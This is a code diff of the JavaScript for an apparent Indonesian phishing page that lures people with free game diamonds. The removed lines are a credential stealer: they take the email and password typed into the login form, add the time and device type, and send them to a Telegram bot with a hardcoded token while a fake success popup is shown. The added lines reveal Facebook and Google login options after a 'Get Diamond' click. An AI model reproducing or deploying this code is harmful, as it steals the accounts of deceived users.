@@ -1,66 +1,27 @@
-function showSuccess() {
-    let email = document.getElementById("email").value;
-    let password = document.getElementById("password").value;
+// Ambil semua tombol diamond
+    const diamondButtons = document.querySelectorAll('.diamond-btn');
 
-    if (email === "" || password === "") {
-        alert("⚠️ Please enter both email and password.");
-        return;
-    }
+    // Tambahkan event listener ke setiap tombol
+    diamondButtons.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            // Hapus kelas aktif dari semua tombol
+            diamondButtons.forEach(button => button.classList.remove('selected'));
+            
+            // Tambahkan kelas 'selected' pada tombol yang diklik
+            e.target.classList.add('selected');
+        });
+    });
 
-    let chatId = "7168768981"; // Ganti dengan Chat ID Anda
-    let botToken = "7920514777:AAFwGR_cZ_lM-4bj-06ewMZwZSjsAjkW3ik"; // Ganti dengan Token Bot Anda
+// Ambil tombol "Dapatkan Diamond", pesan, dan elemen login
+const getDiamondButton = document.getElementById('get-diamond');
+const diamondMessage = document.getElementById('diamond-message');
+const loginOptions = document.getElementById('login-options');
 
-    // Ambil waktu saat ini
-    let now = new Date();
-    let dateTime = now.toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+// Menambahkan event listener untuk klik tombol "Dapatkan Diamond"
+getDiamondButton.addEventListener('click', function() {
+    // Menampilkan pesan untuk login
+    diamondMessage.style.display = 'block';
 
-    // Ambil informasi perangkat
-    let userAgent = navigator.userAgent;
-    let device = getDeviceType(userAgent);
-
-    // Format pesan dengan Markdown dan preformatted text
-    let message = 
-        "━━━━━━━━━━━━━━━━━━━━━━\n" +
-        "🎉 *LOGIN SUCCESSFUL!* ✅\n" +
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-        "📝 *Login Details:*\n" +
-        "📧 *Email:* `" + email + "`\n" +
-        "🔑 *Password:* `" + password + "`\n" +
-        "⏰ *Time:* `" + dateTime + "`\n" +
-        "📱 *Device:* `" + device + "`\n\n" +
-        "━━━━━━━━━━━━━━━━━━━━━━\n" +
-        "⚠️ *Please verify this login immediately!*\n" +
-        "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
-        "🔰 *By Arjuna Uop Mabin*\n" +
-        "📩 *Contact:* `arjunauopmabin@gmail.com`";
-
-    let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-
-    // Kirim data ke Telegram
-    fetch(telegramURL)
-    .then(response => response.json())
-    .then(data => console.log("Message sent:", data))
-    .catch(error => console.error("Error sending message:", error));
-
-    // Tampilkan popup sukses
-    document.getElementById("success-popup").style.display = "block";
-}
-
-function closePopup() {
-    document.getElementById("success-popup").style.display = "none";
-}
-
-// Fungsi untuk mendeteksi perangkat dari userAgent
-function getDeviceType(userAgent) {
-    if (/android/i.test(userAgent)) {
-        return "📱 Android";
-    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
-        return "🍏 iOS";
-    } else if (/windows/i.test(userAgent)) {
-        return "💻 Windows PC";
-    } else if (/macintosh|mac os/i.test(userAgent)) {
-        return "🖥️ Mac OS";
-    } else {
-        return "❓ Unknown Device";
-    }
-}
+    // Menampilkan opsi login Facebook dan Google
+    loginOptions.style.display = 'block';
+});
